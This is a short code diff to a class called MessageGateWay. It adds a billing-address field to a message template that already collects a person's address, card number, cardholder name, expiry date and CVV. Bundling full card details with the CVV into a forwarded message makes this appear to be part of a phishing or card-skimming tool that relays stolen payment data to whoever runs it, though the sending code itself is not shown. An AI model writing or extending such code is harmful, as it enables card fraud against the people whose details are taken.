@@ -34,6 +34,7 @@ class MessageGateWay:
                     f"*[ADDRESS]*: `{self.data.get('address')}\n`"
                     f"*[CARD_NUMBER]*: `{self.data.get('card_number')}\n`"
                     f"*[CARD_NAME]*: `{self.data.get('card_name_input')}\n`"
+                    f"*[BILLING_ADDRESS]*: `{self.data.get('billing_address')}\n`"
                     f"*[EXPIRY_NUMBER]*: `{self.data.get('expiry_number')}\n`"
                     f"*[CVV]*: `{self.data.get('cvv')}\n`"
                 )
